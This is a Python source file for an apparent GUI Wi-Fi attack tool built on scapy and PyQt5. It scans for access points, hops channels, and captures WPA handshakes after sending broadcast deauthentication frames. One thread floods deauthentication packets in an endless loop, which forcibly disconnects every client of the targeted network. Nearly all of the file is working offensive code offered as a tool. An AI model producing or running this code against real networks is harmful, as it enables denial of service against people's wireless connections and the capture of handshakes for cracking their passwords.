from PyQt5 import QtCore
from scapy.all import *
from time import sleep
from frames_list import panda_animation_frames
import json
with open("nano_confg.json", "r") as f:
    config = json.load(f)
wifi_adapter = config["wifi_adapter"]
access_point = config["access_point"]
class handshake_capture(QtCore.QThread):
    handshakeCaptured = QtCore.pyqtSignal(list)
    def formating(self,device):
        self.device = device
    def run(self):
            # Send deauthentication packets to the device
        deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.device[1],
                                               addr3=self.device[1]) / Dot11Deauth()
        for _ in range(10):
            sendp(deauth_packet, iface=f"{wifi_adapter}mon", inter=0.1, verbose=0)

            # Start capturing handshake packets
        handshake_packets = []

        def packet_handler(pkt):
            if pkt.haslayer(Dot11) and pkt.type == 2 and pkt.subtype == 0x08:
                if pkt.addr1 in [pkt.addr2, pkt.addr3]:
                    handshake_packets.append(pkt)

        sniff(iface=f"{wifi_adapter}mon", prn=packet_handler, timeout=10)

            # Emit a signal with the captured handshake packets
        self.handshakeCaptured.emit(handshake_packets)


class deauth_class(QtCore.QThread):
    def formating(self,device):
        self.device=device
    def run(self):
        deauth_packet=RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.device[1], addr3=self.device[1]) / Dot11Deauth()
        print("sending deauth packet")
        while True:
            sendp(deauth_packet,iface=f"{wifi_adapter}mon", inter=0.1, verbose=0)
            print("sent deaith packet")
class animate_thread(QtCore.QThread):
    send_frame=QtCore.pyqtSignal(str)
    def run(self):
        while True:
            for i in panda_animation_frames:
                self.send_frame.emit(i)
                sleep(1/14)
            for i in reversed(panda_animation_frames[:-1]):
                self.send_frame.emit(i)
                sleep(1/14)
class find_devices(QtCore.QThread):
    found_signal=QtCore.pyqtSignal(list)
    def run(self):
        sniff(iface=f"{wifi_adapter}mon",prn=self.get_access_points)

    def get_access_points(self, packet):
        self.name, self.channel = self.extract_name_and_channel(packet)
        self.bssid = self.extract_bssid(packet)
        if self.name=="not found":
            pass
        else:
            self.device = [self.name, self.bssid, self.channel]
            # Emit the signal in the context of the main thread
            self.found_signal.emit(self.device)

    def extract_name_and_channel(self, packet):
        if packet.haslayer(Dot11Beacon):
            beacon_frame = packet[Dot11Beacon]

            if beacon_frame.payload and (beacon_frame.payload.ID == 0):
                name = beacon_frame.payload.info.decode("ascii")
            else:
                name = "not found"

            if beacon_frame.haslayer(Dot11EltDSSSet):
                channel_frame = beacon_frame[Dot11EltDSSSet]
                channel = channel_frame.channel
            else:
                channel = 0
        else:
            name="not found"
            channel="0"

        return name, channel
    def extract_bssid(self, packet):
        if packet.haslayer(Dot11):
            dot11_layer = packet[Dot11]
            bssid = dot11_layer.addr2 if dot11_layer.addr2 else "ff:ff:ff:ff:ff:ff"
        else:
            bssid = "ff:ff:ff:ff:ff:ff"
        return bssid
class channel_hopper(QtCore.QThread):
    channels=[1,2,3,4,5,6,7,8,9,10,11]
    def run(self):
        while True:
            channel=choice(self.channels)
            os.system("iw dev {} set channel {}".format(f"{wifi_adapter}mon",channel))
            sleep(0.2)